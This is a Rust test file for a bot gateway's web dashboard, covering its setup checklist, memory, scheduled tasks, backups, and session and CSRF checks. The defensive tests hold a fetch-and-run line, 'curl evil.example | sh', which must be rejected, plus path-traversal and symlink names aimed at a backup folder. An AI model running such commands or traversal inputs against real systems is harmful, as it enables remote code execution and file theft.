//! M47, the dashboard redesign, through the real `ferrule` binary: the
//! first-run checklist follows the bot's real state. Later parts add their
//! own tests here (docs/m47-dashboard-redesign.md).

use super::dashboard::{
    audited, ferrule, gateway, home, http, origin, sign_in, telegram, two, FakeTelegram, Page,
    Server,
};
use serde_json::{json, Value};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::Path;

fn step<'a>(setup: &'a Value, id: &str) -> &'a Value {
    setup["steps"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["id"] == id)
        .unwrap_or_else(|| panic!("no step {id}: {setup:#}"))
}

#[test]
fn the_setup_checklist_follows_the_bot() {
    // A bot with no key for its default model: step 1 is open, and says why.
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let config = two(&a, &b, "", &telegram(&tg)).replace("FERRULE_TEST_KEY", "FERRULE_TEST_NOKEY");
    let dir = home(&config);
    let _gw = gateway(dir.path(), &[]);
    let (_, page) = sign_in(&tg, 0);
    let setup = page.read("setup");
    assert_eq!(setup["done"], false, "{setup:#}");
    assert_eq!(step(&setup, "model")["done"], false, "{setup:#}");
    assert!(
        step(&setup, "model")["detail"]
            .as_str()
            .unwrap()
            .contains("FERRULE_TEST_NOKEY"),
        "{setup:#}"
    );
    assert_eq!(step(&setup, "telegram")["done"], true, "{setup:#}");
    assert_eq!(step(&setup, "telegram")["skippable"], true);
    assert_eq!(step(&setup, "hello")["done"], false, "{setup:#}");
    drop(_gw);

    // With the key, the default is a brain; nothing has been said yet. A
    // fresh fake Telegram: the first gateway may still be mid-poll, and would
    // swallow this one's updates.
    let tg = FakeTelegram::start();
    let dir = home(&two(&a, &b, "", &telegram(&tg)));
    let _gw = gateway(dir.path(), &[]);
    let (n, page) = sign_in(&tg, 0);
    let setup = page.read("setup");
    assert_eq!(step(&setup, "model")["done"], true, "{setup:#}");
    assert_eq!(step(&setup, "model")["model"], "a/a-one", "{setup:#}");
    assert_eq!(step(&setup, "hello")["done"], false, "{setup:#}");
    assert_eq!(setup["done"], false);

    // The first answer finishes it, and the endpoint itself needs a session.
    tg.say(-100, "hello there");
    tg.wait_for(-100, "A:a-one", n);
    let setup = page.until("setup", |s| s["done"] == true);
    assert_eq!(step(&setup, "hello")["done"], true, "{setup:#}");
    let (status, _, _) = super::dashboard::http(page.port, "GET", "/api/setup", &[], "");
    assert_eq!(status, 401);
}

/// A running bot with its page, and the folder its data lives in.
struct Bot {
    dir: tempfile::TempDir,
    _tg: FakeTelegram,
    a: Server,
    b: Server,
    page: Page,
    _gw: super::dashboard::Running,
}

fn bot(extra: &str, before: impl FnOnce(&Path)) -> Bot {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let dir = home(&two(&a, &b, "", &format!("{}{extra}", telegram(&tg))));
    before(dir.path());
    let gw = gateway(dir.path(), &[]);
    let (_, page) = sign_in(&tg, 0);
    Bot {
        dir,
        _tg: tg,
        a,
        b,
        page,
        _gw: gw,
    }
}

fn remember(home: &Path, text: &str, tags: &str) {
    let out = ferrule(home, &["memory", "add", text, "--tags", tags]);
    assert!(out.status.success(), "{}", super::dashboard::describe(&out));
}

// ---- Memory ----------------------------------------------------------------

#[test]
fn memory_lists_searches_and_forgets() {
    let bot = bot("", |home| {
        remember(home, "Max likes his coffee black", "pref");
        remember(home, "The office wifi is called Stanley", "office");
        remember(home, "שלום עולם", "");
    });
    let page = &bot.page;
    let all = page.read("memory");
    assert_eq!(all["available"], true, "{all:#}");
    let rows = all["memories"].as_array().unwrap();
    assert_eq!(rows.len(), 3, "{all:#}");
    // Newest first, with the tags and a date.
    assert_eq!(rows[0]["text"], "שלום עולם");
    assert_eq!(rows[2]["tags"], json!(["pref"]));
    assert!(rows[2]["at"].as_i64().unwrap() > 1_700_000_000);

    let hit = page.read("memory?q=coffee");
    let hits = hit["memories"].as_array().unwrap();
    assert_eq!(hits.len(), 1, "{hit:#}");
    assert_eq!(hits[0]["text"], "Max likes his coffee black");
    assert!(page.read("memory?q=zebra")["memories"]
        .as_array()
        .unwrap()
        .is_empty());
    assert_eq!(
        page.read("memory?limit=1")["memories"]
            .as_array()
            .unwrap()
            .len(),
        1
    );

    // Forgetting asks first, then deletes for good, and says so in the log.
    let id = hits[0]["id"].as_i64().unwrap();
    let (status, ask) = page.post("memory/forget", json!({ "id": id }));
    assert_eq!(status, 409, "{ask}");
    assert!(ask["confirm"].as_str().unwrap().contains("for good"));
    assert_eq!(
        page.read("memory?q=coffee")["memories"]
            .as_array()
            .unwrap()
            .len(),
        1
    );
    let (status, done) = page.post("memory/forget", json!({ "id": id, "confirm": true }));
    assert_eq!(status, 200, "{done}");
    assert_eq!(done["said"], "Forgot it.");
    assert!(page.read("memory?q=coffee")["memories"]
        .as_array()
        .unwrap()
        .is_empty());
    assert_eq!(page.read("memory")["memories"].as_array().unwrap().len(), 2);
    let (status, none) = page.post("memory/forget", json!({ "id": id, "confirm": true }));
    assert_eq!(status, 404);
    assert_eq!(none["error"], format!("There's no memory {id}."));
    let log = audited(page, "memory.forget");
    assert_eq!(log.len(), 1, "{log:?}");
    assert!(!log[0].to_string().contains("coffee"), "{log:?}");
}

#[test]
fn a_bot_with_no_memory_file_says_how_memories_get_made() {
    let bot = bot("", |_| {});
    let none = bot.page.read("memory");
    assert_eq!(none["available"], false, "{none:#}");
    assert!(none["why"]
        .as_str()
        .unwrap()
        .starts_with("No memories yet."));
    assert_eq!(none["memories"], json!([]));
    let (status, _) = bot
        .page
        .post("memory/forget", json!({ "id": 1, "confirm": true }));
    assert_eq!(status, 404);
}

#[test]
fn memory_search_calls_no_model() {
    // An embedder is configured, at a port that counts who knocks: a page
    // search is keyword only, so nobody does.
    let knocks = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = knocks.local_addr().unwrap().port();
    let count = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let c = count.clone();
    std::thread::spawn(move || {
        for _ in knocks.incoming().flatten() {
            c.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        }
    });
    let extra = format!(
        "\n[memory]\nembedder = \"openai\"\nbase_url = \"http://127.0.0.1:{port}/v1\"\napi_key_env = \"FERRULE_TEST_KEY\"\nmodel = \"m\"\ndimensions = 8\n"
    );
    let bot = bot(&extra, |home| {
        remember(home, "the boiler is in the garage", "")
    });
    for q in ["boiler", "garage", "nothing at all", ""] {
        let found = bot.page.read(&format!("memory?q={q}"));
        assert_eq!(found["available"], true, "{found:#}");
    }
    assert_eq!(count.load(std::sync::atomic::Ordering::SeqCst), 0);
    assert!(bot.a.calls().is_empty() && bot.b.calls().is_empty());
}

// ---- Tasks -------------------------------------------------------------------

fn task(name: &str) -> Value {
    json!({
        "name": name, "prompt": "Summarise the news.", "kind": "cron",
        "schedule": "0 9 * * 1-5", "timezone": "Asia/Jerusalem", "to": "chat",
    })
}

#[test]
fn a_task_added_on_the_page_is_listed_and_audited() {
    let bot = bot("", |_| {});
    let page = &bot.page;
    let (status, added) = page.post("tasks/add", task("Morning news"));
    assert_eq!(status, 200, "{added}");
    assert!(added["said"]
        .as_str()
        .unwrap()
        .starts_with("Added \u{201c}Morning news\u{201d}. Next run: "));
    assert!(added["said"].as_str().unwrap().contains("(Asia/Jerusalem)"));
    let tasks = page.read("tasks");
    let row = tasks["tasks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|t| t["name"] == "Morning news")
        .unwrap_or_else(|| panic!("{tasks:#}"))
        .clone();
    assert_eq!(row["schedule"], "0 9 * * 1-5");
    assert_eq!(row["timezone"], "Asia/Jerusalem");
    assert_eq!(row["destination"], "dashboard chat owner");
    assert_eq!(row["id"], added["id"]);
    assert!(row["next_run_at"].as_i64().unwrap() > chrono_now());
    // "owner" goes to the owner's own chat on Telegram.
    let (_, to_owner) = page.post(
        "tasks/add",
        json!({ "name": "Ping", "prompt": "Say hi.", "kind": "cron",
                "schedule": "0 8 * * *", "timezone": "UTC", "to": "owner" }),
    );
    let tasks = page.read("tasks");
    let ping = tasks["tasks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|t| t["id"] == to_owner["id"])
        .unwrap();
    assert_eq!(ping["destination"], "telegram chat 42", "{tasks:#}");
    let log = audited(page, "task.add");
    assert_eq!(log.len(), 2, "{log:?}");
    assert!(
        !log[0].to_string().contains("Summarise"),
        "no prompt in the log"
    );
    // The same store the CLI reads.
    let out = ferrule(bot.dir.path(), &["tasks", "list"]);
    assert!(super::dashboard::describe(&out).contains("Morning news"));
}

fn chrono_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
}

#[test]
fn the_preview_matches_the_parser_for_every_preset() {
    use ferrule_gateway::{initial_next_run_at, TaskKind};
    let bot = bot("", |_| {});
    let mut presets: Vec<String> = vec![
        "0 9 * * *".into(),
        "30 7 * * 1-5".into(),
        "0 18 * * 5".into(),
        "0 9 1 * *".into(),
        "0 9 28 * *".into(),
    ];
    presets.extend([1, 2, 3, 4, 6, 8, 12].map(|n| format!("0 */{n} * * *")));
    for tz in ["Asia/Jerusalem", "America/New_York", "UTC"] {
        for cron in &presets {
            let before = chrono::Utc::now();
            let (status, got) = bot.page.post(
                "tasks/preview",
                json!({ "kind": "cron", "schedule": cron, "timezone": tz }),
            );
            assert_eq!(status, 200, "{cron} {tz}: {got}");
            let next: Vec<i64> = got["next"]
                .as_array()
                .unwrap()
                .iter()
                .map(|v| v.as_i64().unwrap())
                .collect();
            assert_eq!(next.len(), 3, "{cron} {tz}: {got}");
            assert!(next.windows(2).all(|w| w[0] < w[1]), "{next:?}");
            let mut want = vec![];
            let mut at = before;
            for _ in 0..3 {
                let n = initial_next_run_at(TaskKind::Cron, cron, tz, at)
                    .unwrap()
                    .unwrap();
                want.push(n);
                at = chrono::DateTime::from_timestamp(n, 0).unwrap();
            }
            assert_eq!(next, want, "{cron} in {tz}");
        }
    }
    // A one-off is a wall-clock time in the chosen zone.
    let (status, got) = bot.page.post(
        "tasks/preview",
        json!({ "kind": "once", "schedule": "2099-01-01T09:00", "timezone": "Asia/Jerusalem" }),
    );
    assert_eq!(status, 200, "{got}");
    // 09:00 in Jerusalem in January is 07:00 UTC.
    let want = chrono::DateTime::parse_from_rfc3339("2099-01-01T07:00:00Z")
        .unwrap()
        .timestamp();
    assert_eq!(got["next"], json!([want]));
}

#[test]
fn a_bad_schedule_says_why() {
    let bot = bot("", |_| {});
    let page = &bot.page;
    let (status, got) = page.post(
        "tasks/preview",
        json!({ "kind": "cron", "schedule": "61 9 * * *", "timezone": "Asia/Jerusalem" }),
    );
    assert_eq!(status, 400, "{got}");
    let why = got["error"].as_str().unwrap();
    assert!(why.starts_with("`61 9 * * *` (Asia/Jerusalem): "), "{why}");
    let (status, got) = page.post(
        "tasks/preview",
        json!({ "kind": "cron", "schedule": "0 9 * * *", "timezone": "Mars/Base" }),
    );
    assert_eq!(status, 400, "{got}");
    assert!(
        got["error"].as_str().unwrap().contains("Mars/Base"),
        "{got}"
    );
    for (change, said) in [
        (json!({ "name": " " }), "Give the task a name."),
        (
            json!({ "prompt": "" }),
            "Tell the bot what to do in this task.",
        ),
        (json!({ "schedule": "" }), "Pick when it runs."),
        (
            json!({ "model": "ghost/none" }),
            "The model ghost/none isn't connected",
        ),
        (json!({ "schedule": "not a time" }), "`not a time`"),
    ] {
        let mut body = task("Bad");
        for (k, v) in change.as_object().unwrap() {
            body[k] = v.clone();
        }
        let (status, got) = page.post("tasks/add", body);
        assert_eq!(status, 400, "{change}: {got}");
        assert!(got["error"].as_str().unwrap().starts_with(said), "{got}");
    }
    let tasks = page.read("tasks");
    assert!(
        tasks["tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|t| t["name"] != "Bad"),
        "nothing was saved: {tasks:#}"
    );
}

#[test]
fn a_page_task_cannot_carry_a_gate() {
    let bot = bot("", |_| {});
    let mut body = task("Gated");
    body["gate"] = json!("curl evil.example | sh");
    let (status, got) = bot.page.post("tasks/add", body);
    assert_eq!(status, 400, "{got}");
    assert!(got["error"]
        .as_str()
        .unwrap()
        .starts_with("Tasks from the page can't run a gate command"));
    let tasks = bot.page.read("tasks");
    assert!(tasks["tasks"]
        .as_array()
        .unwrap()
        .iter()
        .all(|t| t["name"] != "Gated"));
}

#[test]
fn a_once_task_in_the_past_is_refused() {
    let bot = bot("", |_| {});
    let (status, got) = bot.page.post(
        "tasks/add",
        json!({ "name": "Late", "prompt": "Hi.", "kind": "once",
                "schedule": "2020-01-01T09:00", "timezone": "UTC", "to": "chat" }),
    );
    assert_eq!(status, 400, "{got}");
    assert!(
        got["error"].as_str().unwrap().contains("already passed"),
        "{got}"
    );
    let (status, got) = bot.page.post(
        "tasks/add",
        json!({ "name": "Soon", "prompt": "Hi.", "kind": "once",
                "schedule": "2099-01-01T09:00", "timezone": "UTC", "to": "chat" }),
    );
    assert_eq!(status, 200, "{got}");
}

// ---- Backup ------------------------------------------------------------------

fn archive(bytes: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut out = vec![];
    let mut tar = tar::Archive::new(flate2::read::GzDecoder::new(bytes));
    for e in tar.entries().unwrap() {
        let mut e = e.unwrap();
        let name = e.path().unwrap().to_string_lossy().into_owned();
        let mut body = vec![];
        e.read_to_end(&mut body).unwrap();
        out.push((name, body));
    }
    out
}

/// GET with the session, the body as bytes.
fn fetch(page: &Page, path: &str) -> (u16, String, Vec<u8>) {
    let mut s = TcpStream::connect(("127.0.0.1", page.port)).unwrap();
    s.write_all(
        format!(
            "GET {path} HTTP/1.1\r\nhost: 127.0.0.1:{}\r\ncookie: {}\r\nconnection: close\r\n\r\n",
            page.port, page.cookie
        )
        .as_bytes(),
    )
    .unwrap();
    let mut raw = vec![];
    s.read_to_end(&mut raw).unwrap();
    let at = raw.windows(4).position(|w| w == b"\r\n\r\n").unwrap();
    let head = String::from_utf8_lossy(&raw[..at]).into_owned();
    let status = head.split_whitespace().nth(1).unwrap().parse().unwrap();
    (status, head, raw[at + 4..].to_vec())
}

fn back_up(page: &Page) -> Value {
    let (status, said) = page.post("backup", json!({}));
    assert_eq!(status, 202, "{said}");
    std::thread::sleep(std::time::Duration::from_millis(50));
    let list = page.until("backups", |l| l["running"] == false);
    assert_eq!(list["error"], Value::Null, "{list:#}");
    list
}

fn seed_data(home: &Path) {
    std::fs::create_dir_all(home.join("data/private")).unwrap();
    std::fs::write(home.join("data/private/secrets.env"), "KEY=SECRETSEED\n").unwrap();
    std::fs::create_dir_all(home.join("data/sessions")).unwrap();
    std::fs::write(home.join("data/sessions/telegram_42.jsonl"), "{\"hi\":1}\n").unwrap();
}

#[test]
fn a_page_backup_downloads_and_has_no_secrets() {
    let bot = bot("", seed_data);
    let list = back_up(&bot.page);
    let files = list["files"].as_array().unwrap();
    assert_eq!(files.len(), 1, "{list:#}");
    assert_eq!(list["secrets"], false);
    let name = files[0]["name"].as_str().unwrap();
    assert!(name.ends_with("-backup-".to_string().as_str()) || name.contains("-backup-"));
    let (status, head, body) = fetch(&bot.page, &format!("/api/backups/download?name={name}"));
    assert_eq!(status, 200, "{head}");
    let lower = head.to_ascii_lowercase();
    assert!(lower.contains("content-type: application/gzip"), "{head}");
    assert!(lower.contains(&format!(
        "content-disposition: attachment; filename=\"{name}\""
    )));
    assert!(lower.contains("cache-control: no-store"), "{head}");
    assert_eq!(body.len() as u64, files[0]["bytes"].as_u64().unwrap());
    let entries = archive(&body);
    let manifest: Value = serde_json::from_slice(
        &entries
            .iter()
            .find(|(n, _)| n == "manifest.json")
            .unwrap()
            .1,
    )
    .unwrap();
    assert_eq!(manifest["secrets"], false, "{manifest:#}");
    assert!(entries
        .iter()
        .any(|(n, _)| n == "data/sessions/telegram_42.jsonl"));
    assert!(
        entries.iter().all(|(n, _)| !n.contains("private")),
        "{entries:?}"
    );
    assert!(entries
        .iter()
        .all(|(_, b)| !String::from_utf8_lossy(b).contains("SECRETSEED")));
    // The page never shows a server path: no "last" line, only the files.
    assert!(list.get("last").is_none(), "{list:#}");
    // Deleting asks, then removes the file.
    let (status, ask) = bot.page.post("backups/delete", json!({ "name": name }));
    assert_eq!(status, 409, "{ask}");
    let (status, _) = bot
        .page
        .post("backups/delete", json!({ "name": name, "confirm": true }));
    assert_eq!(status, 200);
    assert!(bot.page.read("backups")["files"]
        .as_array()
        .unwrap()
        .is_empty());
    assert_eq!(
        fetch(&bot.page, &format!("/api/backups/download?name={name}")).0,
        404
    );
}

#[test]
fn backup_names_cannot_leave_the_backups_dir() {
    let bot = bot("", seed_data);
    let dir = bot.dir.path().join("data/backups");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(bot.dir.path().join("data/private/loot.tar.gz"), "loot").unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(
        bot.dir.path().join("data/private/loot.tar.gz"),
        dir.join("link.tar.gz"),
    )
    .unwrap();
    for name in [
        "../private/loot.tar.gz",
        "..%2Fprivate%2Floot.tar.gz",
        "a/b.tar.gz",
        "a%5Cb.tar.gz",
        "x.tar.gz%00",
        ".hidden.tar.gz",
        "loot.txt",
        "",
    ] {
        let (status, head, body) = fetch(&bot.page, &format!("/api/backups/download?name={name}"));
        assert_eq!(status, 400, "{name}: {head}");
        assert!(!String::from_utf8_lossy(&body).contains("loot"));
        let (status, _) = bot
            .page
            .post("backups/delete", json!({ "name": name, "confirm": true }));
        assert!(status == 400 || status == 404, "{name}: {status}");
    }
    // A symlink in the folder isn't a backup: not listed, not served, not deleted.
    #[cfg(unix)]
    {
        assert!(bot.page.read("backups")["files"]
            .as_array()
            .unwrap()
            .is_empty());
        let (status, _, body) = fetch(&bot.page, "/api/backups/download?name=link.tar.gz");
        assert_eq!(status, 404);
        assert!(!String::from_utf8_lossy(&body).contains("loot"));
        let (status, _) = bot.page.post(
            "backups/delete",
            json!({ "name": "link.tar.gz", "confirm": true }),
        );
        assert_eq!(status, 404);
    }
    assert!(bot.dir.path().join("data/private/loot.tar.gz").exists());
    // And a name that is fine but isn't there.
    let (status, _, _) = fetch(&bot.page, "/api/backups/download?name=gone.tar.gz");
    assert_eq!(status, 404);
}

#[test]
fn only_three_page_backups_are_kept() {
    let bot = bot("", seed_data);
    let mut names = vec![];
    for _ in 0..5 {
        let list = back_up(&bot.page);
        names.push(list["files"][0]["name"].as_str().unwrap().to_string());
        // The stamp has one-second resolution.
        std::thread::sleep(std::time::Duration::from_millis(1100));
    }
    let list = bot.page.read("backups");
    let kept: Vec<&str> = list["files"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| f["name"].as_str().unwrap())
        .collect();
    assert_eq!(kept.len(), 3, "{list:#}");
    assert_eq!(
        kept,
        [names[4].as_str(), names[3].as_str(), names[2].as_str()]
    );
}

#[test]
fn a_backup_does_not_contain_the_last_one() {
    let bot = bot("", seed_data);
    back_up(&bot.page);
    std::thread::sleep(std::time::Duration::from_millis(1100));
    let list = back_up(&bot.page);
    let newest = list["files"][0]["name"].as_str().unwrap();
    let (_, _, body) = fetch(&bot.page, &format!("/api/backups/download?name={newest}"));
    let entries = archive(&body);
    assert!(
        entries
            .iter()
            .all(|(n, _)| !n.contains("backups") && !n.contains(".tar.gz")),
        "{:?}",
        entries.iter().map(|(n, _)| n).collect::<Vec<_>>()
    );
}

// ---- The new endpoints' threat model -------------------------------------------

#[test]
fn the_new_posts_need_a_session_and_csrf() {
    let bot = bot("", seed_data);
    let port = bot.page.port;
    let o = origin(port);
    let posts = [
        ("memory/forget", json!({ "id": 1, "confirm": true })),
        ("tasks/preview", json!({ "schedule": "0 9 * * *" })),
        ("tasks/add", task("X")),
        ("backup", json!({})),
        (
            "backups/delete",
            json!({ "name": "a.tar.gz", "confirm": true }),
        ),
    ];
    for (path, body) in &posts {
        let url = format!("/api/{path}");
        let json_headers = [("origin", o.as_str()), ("content-type", "application/json")];
        // No session.
        let (status, _, _) = http(port, "POST", &url, &json_headers, &body.to_string());
        assert_eq!(status, 401, "{path} without a session");
        // A session but no CSRF header.
        let with_cookie = [
            ("origin", o.as_str()),
            ("content-type", "application/json"),
            ("cookie", bot.page.cookie.as_str()),
        ];
        let (status, _, _) = http(port, "POST", &url, &with_cookie, &body.to_string());
        assert_eq!(status, 403, "{path} without CSRF");
    }
    for get in ["memory", "backups", "backups/download?name=a.tar.gz"] {
        let (status, _, _) = http(port, "GET", &format!("/api/{get}"), &[], "");
        assert_eq!(status, 401, "{get} without a session");
    }
    // Nothing above changed anything.
    assert!(bot.page.read("backups")["files"]
        .as_array()
        .unwrap()
        .is_empty());
    assert!(bot.page.read("tasks")["tasks"]
        .as_array()
        .unwrap()
        .iter()
        .all(|t| t["name"] != "X"));
}
